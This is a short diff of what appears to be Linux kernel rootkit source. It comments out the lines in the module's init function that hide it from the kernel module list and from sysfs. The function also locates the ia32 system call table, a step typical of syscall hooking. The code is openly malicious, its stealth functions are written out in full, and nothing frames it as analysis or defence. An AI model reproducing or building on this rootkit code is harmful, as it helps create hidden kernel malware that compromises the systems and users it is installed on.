@@ -1018,10 +1018,10 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 {
     /* Hide LKM and all symbols */
-    list_del_init(&__this_module.list);
+    //list_del_init(&__this_module.list);
 
     /* Hide LKM from sysfs */
-    kobject_del(__this_module.holders_dir->parent);
+    //kobject_del(__this_module.holders_dir->parent);
 
     #if defined(_CONFIG_X86_64_)
     ia32_sys_call_table = find_ia32_sys_call_table();
